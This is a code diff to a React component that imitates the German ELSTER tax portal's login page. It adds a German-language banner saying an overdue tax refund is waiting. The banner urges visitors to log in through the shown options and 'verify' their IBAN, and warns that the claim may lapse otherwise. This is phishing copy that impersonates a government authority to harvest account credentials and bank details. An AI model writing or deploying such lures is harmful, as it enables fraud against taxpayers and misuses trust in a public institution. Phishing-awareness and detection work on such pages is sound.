@@ -146,6 +146,20 @@ const Elster = () => {
 
         {/* Content */}
         <section>
+          <div style={{
+            background: "#f4f8ec",
+            borderLeft: "4px solid #78b434",
+            padding: "16px 20px",
+            margin: "4px 0 20px",
+            maxWidth: 820,
+          }}>
+            <div style={{ fontSize: 18, fontWeight: 700, color: TEXT, marginBottom: 8 }}>
+              Ihr ausstehender Betrag zur Steuerrückzahlung wartet
+            </div>
+            <p style={{ fontSize: 14, lineHeight: 1.55, color: TEXT, margin: 0 }}>
+              Gemäß den geltenden europäischen Gesetzesbestimmungen steht Ihnen die unverzügliche Auszahlung Ihres zu viel entrichteten Steuerbetrags zu. Um die Rückerstattung fristgerecht veranlassen zu können, ist eine Anmeldung in Ihrem ELSTER-Benutzerkonto sowie die Bestätigung Ihrer hinterlegten Bankverbindung zwingend erforderlich. Bitte loggen Sie sich über eine der untenstehenden Login-Optionen ein und verifizieren Sie Ihre IBAN, damit die Überweisung des Ihnen zustehenden Betrags umgehend ausgelöst werden kann. Eine ausbleibende Bestätigung kann zu einer Verzögerung oder zum Verfall des Erstattungsanspruchs führen.
+            </p>
+          </div>
           <h1 style={{ fontSize: 28, fontWeight: 400, color: TEXT, margin: "4px 0 20px" }}>Login-Optionen</h1>
 
           <div style={{ display: "grid", gridTemplateColumns: "260px 1fr 260px", columnGap: 0, paddingRight: 16 }} className="elster-content">
